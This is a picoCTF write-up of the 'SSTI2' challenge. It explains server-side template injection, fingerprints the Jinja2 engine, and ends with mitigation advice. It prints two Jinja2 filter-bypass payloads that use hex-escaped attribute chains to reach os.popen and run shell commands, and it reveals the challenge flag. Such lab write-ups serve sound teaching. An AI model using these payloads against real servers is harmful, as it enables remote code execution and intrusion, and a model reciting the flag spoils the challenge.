# SSTI2

## Challenge
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.


### Solve
**Flag:** `picoCTF{sst1_f1lt3r_byp4ss_63b833cd}`\
**SSTI** stands for *Server Side Template Injection*.\
It is a vulnerability where untrusted user input is fed into a server template engine, allowing the input to be evaluated as template code. In mild cases it leaks data; in severe cases it lets an attacker execute server-side code.\
This level explores the same.
- After launching the challenge instance, I was provided with a link.
- A website is given which will announce whatever I type into it!?
- And since the challenge name is SSTI2, it hints at a typical injecting problem.
- Used this image to determine the templating engine the site was using.

    - ${7*7} didn’t work
    - {{7*7}} works
    - {{7*’7'}} works
- Therefore, the engine used is either `Twig` or `Jinja2`
> Custom payload

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```


### New Learnings
**Templating Engines**
- They convert templates + data into HTML; different engines (Jinja, Twig, ERB) have different syntax and object models — fingerprinting the engine is the first step.

**Injections**
- SSTI happens when untrusted input is injected into a template and evaluated. What looks like text can become code executed on the server.

**Payloads**
- A payload is the little piece of input you send into a program or web app that’s designed to do something — test, probe, or exploit.

**Mitigation**
- Never render raw user input. Escape or sanitize inputs, use strict template sandboxes/whitelists, remove/limit dangerous globals, apply least privilege on server processes, and keep template libraries updated.


### Resources
- [Article by tobias are](https://medium.com/@vgqxjb/ssti2-picoctf-4caa7ac497c5)
- [onsecurity.io blog](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)
